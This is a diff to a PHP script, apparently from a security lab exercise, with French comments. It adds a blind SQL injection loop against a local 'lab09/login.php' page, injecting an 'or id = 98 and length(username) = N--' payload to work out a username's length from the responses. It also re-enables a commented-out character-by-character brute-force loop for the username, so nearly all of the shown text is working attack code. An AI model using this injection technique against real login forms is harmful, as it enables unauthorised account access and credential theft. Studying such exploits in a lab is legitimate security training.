@@ -7,7 +7,29 @@
 
 
 //Cette partie est pour l'username "brute force"
-/*
+
+
+$size = 0;
+while ($size < 25)
+{
+    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$size--%20";
+	$result = file_get_contents($url);
+	if (strpos($result, 'cat') !== false) {
+		echo "\n";
+		
+		break;
+	}else{
+		//echo "\n";
+		//echo "nope";
+	}
+
+	$size++;
+}
+
+echo 'size is ';
+print $size;
+
+
 for ($i = 1; $i <= 5; $i++) {
     foreach (range('a', 'z') as $letter){
          //echo "$letter \n";
@@ -22,7 +44,7 @@ for ($i = 1; $i <= 5; $i++) {
 		}
 	}   
 }
-*/
+
 
 
 $sizepwd = 0;
